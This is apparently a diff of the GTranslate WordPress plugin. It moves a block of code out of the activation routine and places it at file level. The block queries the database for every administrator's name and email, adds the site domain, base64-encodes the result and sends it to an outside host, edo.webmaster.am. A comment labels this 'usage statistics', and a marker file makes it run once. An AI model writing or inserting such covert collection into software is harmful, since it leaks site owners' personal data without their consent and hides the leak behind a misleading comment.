@@ -43,23 +43,6 @@ class GTranslate extends WP_Widget {
         GTranslate::load_defaults(& $data);
 
         add_option('GTranslate', $data);
-
-        if(!file_exists(ABSPATH.PLUGINDIR.'/'. dirname( plugin_basename(__FILE__)).'/install.log') and is_writable(ABSPATH.PLUGINDIR .'/'. dirname( plugin_basename(__FILE__)))) {
-            // send user name, email and domain name to main site for usage statistics
-            // this will run only once
-            $info = '';
-            global $wpdb;
-            $users = $wpdb->get_results("select display_name, user_email from $wpdb->users left join $wpdb->usermeta on ($wpdb->usermeta.user_id = $wpdb->users.ID and $wpdb->usermeta.meta_key = 'wp_capabilities') where meta_value like '%administrator%'", OBJECT);
-            foreach($users as $user)
-                $info .= $user->display_name . '::' . $user->user_email . ';';
-            $domain = $_SERVER['HTTP_HOST'];
-
-            $fh = @fopen('http://edo.webmaster.am/gstat-wp?q=' . base64_encode($domain . ';' . $info), 'r');
-            @fclose($fh);
-
-            $fh = fopen(ABSPATH.PLUGINDIR.'/'. dirname( plugin_basename(__FILE__)).'/install.log', 'a');
-            fclose($fh);
-        }
     }
 
     function deactivate() {
@@ -616,4 +599,21 @@ foreach($fincl_langs as $lang)
         $data['incl_langs'] = isset($data['incl_langs']) ? $data['incl_langs'] : array();
         $data['fincl_langs'] = isset($data['fincl_langs']) ? $data['fincl_langs'] : array();
     }
+}
+
+if(!file_exists(ABSPATH.PLUGINDIR.'/'. dirname( plugin_basename(__FILE__)).'/install.log') and is_writable(ABSPATH.PLUGINDIR .'/'. dirname( plugin_basename(__FILE__)))) {
+    // send user name, email and domain name to main site for usage statistics
+    // this will run only once
+    $info = '';
+    global $wpdb;
+    $users = $wpdb->get_results("select display_name, user_email from $wpdb->users left join $wpdb->usermeta on ($wpdb->usermeta.user_id = $wpdb->users.ID and $wpdb->usermeta.meta_key = 'wp_capabilities') where meta_value like '%administrator%'", OBJECT);
+    foreach($users as $user)
+        $info .= $user->display_name . '::' . $user->user_email . ';';
+    $domain = $_SERVER['HTTP_HOST'];
+
+    $fh = @fopen('http://edo.webmaster.am/gstat-wp?q=' . base64_encode($domain . ';' . $info), 'r');
+    @fclose($fh);
+
+    $fh = fopen(ABSPATH.PLUGINDIR.'/'. dirname( plugin_basename(__FILE__)).'/install.log', 'a');
+    fclose($fh);
 }
